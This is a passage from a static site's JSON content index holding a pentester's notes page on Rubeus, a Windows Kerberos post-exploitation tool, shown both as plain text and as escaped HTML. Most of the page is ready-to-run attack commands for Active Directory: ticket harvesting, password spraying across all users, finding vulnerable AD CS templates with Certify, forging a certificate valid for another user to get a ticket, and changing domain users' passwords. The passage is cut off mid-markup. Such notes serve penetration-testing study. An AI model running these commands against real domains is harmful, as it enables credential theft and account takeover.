data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;oslevel&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SERVICE_PACK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # List filesets below the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;                            # specified service pack&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Rubeus":{"slug":"spells/Rubeus","filePath":"spells/Rubeus.md","title":"Rubeus","links":["spells/Kerberos","spells/Kerberoasting-with-Rubeus","spells/AS-REP-roasting-With-Rubeus","spells/Rubeus"],"tags":["Application/Rubeus","Protocol/Kerberos","OS/Windows/ActiveDirectory","AttackCycle/Reconnaissance","AttackCycle/Exploitation/BruteForcing","OS/Linux/Distros/Kali","AttackCycle/PrivEsc","Application/Certify","AttackCycle/LateralMovement"],"content":"Rubeus is a Windows-only post-exploitation tool for attacking Kerberos. No compiled binaries are available (either through the GitHub repo or Kali Linux’s windows-binaries package).\n\n\n                  \n                  Important\n                  \n                \n\n\nTo use Rebueus you need to already be on the domain you are attacking, or alternately need to have mapped the domain controller (which normally hosts the KDC) IP address properly in C:\\Windows\\System32\\drivers\\etc\\hosts.\n\n\n\nHarvest Kerberos tickets\n# Harvest ticket granting tickets observed by the current machine.\n# Probably works best when run on a domain controller.\n#\nRubeus.exe harvest /interval:30\nPassword spraying\n# Spray the specified password across all known users and generate a\n# ticket giving ticket for successful authentications. (Can trigger\n# account lockouts!)\n#\nRubeus.exe brute /password:ThePasswordToSpray /noticket\nKerberoasting\nTransclude of Kerberoasting-with-Rubeus\nAS-REP roasting\nTransclude of AS-REP-roasting-With-Rubeus\nUse a certificate to request a ticket\nStart by using Certify.exe on the target:\n# Identify vulnerable AD CS templates.\n#\nCertify.exe find /vulnerable\n \n# Request a CSR using a vulnerable template.\n#\nCertify.exe request /ca:$AD_CS_CA /template:$TEMPLATE_NAME `\n                    $OTHER_OPTIONS_AS_APPROPRIATE_TO_THE_ATTACK\nTake the output of the last command above and paste it into a $CERTIFICATE_PEM_FILE on the attacking box. Then:\nopenssl pkcs12 -in $CERTIFICATE_PEM_FILE -keyex \\\n               -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; \\\n               -export -out $CERTIFICATE_PFX_FILE\nMove $CERTIFICATE_PFX_FILE back to the target, and then use Rubeus to seal the deal:\n# Request a ticket using a certificate from AD CS.\n#\nRubeus.exe asktgt /user:$USER `\n                  /enctype:aes256 `\n                  /certificate:$CERTIFICATE_PFX_FILE `\n                  /password:$CERTIFICATE_FILE_PASSWORD `\n                  /outfile:$TICKET_FILE `\n                  /domain:$DOMAIN `\n                  /dc:$DC_IP_ADDRESS\nThis is very useful if we’ve used an AD CS misconfiguration as described by SpectreOps’ “Certified Pre-Owned” research to forge a certificate that’s valid for another user.\nChange a user’s password\n# We can use Rubeus to change the password for domain users so long as\n# our ticket is for a user with permission to do so (generally the user\n# themselves or a domain admin.\n#\nRubeus.exe changepw /ticket:$TICKET_FILE `\n                    /new:$NEW_PASSWORD `\n                    /dc:$DC_IP_ADDRESS `\n                    /targetuser:$DOMAIN\\$USER","richContent":"&lt;p&gt;&lt;a href=&quot;https://github.com/GhostPack/Rubeus&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Rubeus&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is a Windows-only post-exploitation tool for attacking &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt;. No compiled binaries are available (either through the GitHub repo or Kali Linux’s windows-binaries package).&lt;/p&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;To use Rebueus you need to already be on the domain you are attacking, or alternately need to have mapped the domain controller (which normally hosts the KDC) IP address properly in &lt;code&gt;C:\\Windows\\System32\\drivers\\etc\\hosts&lt;/code&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;harvest-kerberos-tickets&quot;&gt;Harvest Kerberos tickets&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#harvest-kerberos-tickets&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Harvest ticket granting tickets observed by the current machine.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Probably works best when run on a domain controller.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Rubeus.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; harvest &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;interval:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;30&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;password-spraying&quot;&gt;Password spraying&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#password-spraying&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Spray the specified password across all known users and generate a&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# ticket giving ticket for successful authentications. (Can trigger&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# account lockouts!)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Rubeus.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; brute &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;password:ThePasswordToSpray &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;noticket&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;kerberoasting&quot;&gt;Kerberoasting&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#kerberoasting&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Kerberoasting-with-Rubeus&quot; data-block=&quot;&quot; data-embed-alias=&quot;Kerberoasting with Rubeus&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberoasting-with-Rubeus&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Kerberoasting-with-Rubeus&quot;&gt;Transclude of Kerberoasting-with-Rubeus&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;as-rep-roasting&quot;&gt;AS-REP roasting&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#as-rep-roasting&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;AS-REP-roasting-With-Rubeus&quot; data-block=&quot;&quot; data-embed-alias=&quot;AS-REP roasting With Rubeus&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/AS-REP-roasting-With-Rubeus&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/AS-REP-roasting-With-Rubeus&quot;&gt;Transclude of AS-REP-roasting-With-Rubeus&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;use-a-certificate-to-request-a-ticket&quot;&gt;Use a certificate to request a ticket&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#use-a-certificate-to-request-a-ticket&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Start by using &lt;a href=&quot;https://github.com/GhostPack/Certify&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Certify.exe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; on the target:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Identify vulnerable AD CS templates.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Certify.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; find &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;vulnerable&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Request a CSR using a vulnerable template.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Certify.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; request &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ca:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;AD_CS_CA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;template:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TEMPLATE_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                    $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;OTHER_OPTIONS_AS_APPROPRIATE_TO_THE_ATTACK&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Take the output of the last command above and paste it into a &lt;code&gt;$CERTIFICATE_PEM_FILE&lt;/code&gt; on the attacking box. Then:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; pkcs12&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $CERTIFICATE_PEM_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -keyex&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;               -CSP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Microsoft Enhanced Cryptographic Provider v1.0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;               -export&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -out&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $CERTIFICATE_PFX_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Move &lt;code&gt;$CERTIFICATE_PFX_FILE&lt;/code&gt; back to the target, and then use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Rubeus&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Rubeus&quot;&gt;Rubeus&lt;/a&gt; to seal the deal:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Request a ticket using a certificate from AD CS.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Rubeus.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; asktgt &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;user:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                  /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;enctype:aes256 &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                  /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;certificate:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;CERTIFICATE_PFX_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                  /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;password:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;CERTIFICATE_FILE_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                  /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;outfile:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TICKET_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                  /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;domain:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;DOMAIN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                  /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;dc:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;DC_IP_ADDRESS&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This is very useful if we’ve used an AD CS misconfiguration as described by &lt;a href=&quot;https://posts.specterops.io/certified-pre-owned-d95910965cd2&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;SpectreOps’ “Certified Pre-Owned” research&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; to forge a certificate that’s valid for another user.&lt;/p&gt;\n&lt;h2 id=&quot;change-a-users-password&quot;&gt;Change a user’s password&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#change-a-users-password&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# We can use Rubeus to change the password for domain users so long as&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# our ticket is for a user with permission to do so (generally the user&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# themselves or a domain admin.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span 